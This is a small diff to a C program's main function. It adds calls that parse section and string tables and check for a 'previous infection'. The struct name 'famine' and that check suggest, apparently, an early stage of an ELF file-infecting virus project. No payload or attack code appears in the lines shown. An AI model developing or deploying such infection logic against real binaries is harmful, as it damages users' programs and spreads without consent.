@@ -58,7 +58,11 @@ int main(int argc, char **argv, char **env)
         return (1);
     }
 
+    ft_pointer_section_table(famine);
+    ft_pointer_strings_table(famine);
     ft_printheader(famine);
+
+    ft_detect_prev_infection(famine);
 
     close(famine->fd);
     free(famine);
